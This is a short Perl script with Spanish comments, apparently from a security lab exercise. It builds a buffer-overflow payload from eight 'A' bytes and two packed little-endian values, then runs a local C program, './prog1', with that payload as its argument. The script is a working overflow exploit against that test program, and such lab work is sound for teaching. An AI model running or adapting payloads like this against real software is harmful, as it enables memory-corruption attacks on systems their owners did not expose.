#!/usr/bin/perl

use strict;
use warnings;

# Valores específicos para val1 y val2
my $val1 = 1818390343;
my $val2 = 1917480553;

# Construir el payload para el desbordamiento de búfer
my $payload = "A" x 8;                     # Rellena el buffer con 8 caracteres 'A'
$payload .= pack('V', $val1);              # Agrega el valor de val1 en formato little endian
$payload .= pack('V', $val2);              # Agrega el valor de val2 en formato little endian

# Ejecutar el programa C con el payload como argumento
my $programa = './prog1';                  # Ruta al programa compilado
system($programa, $payload);
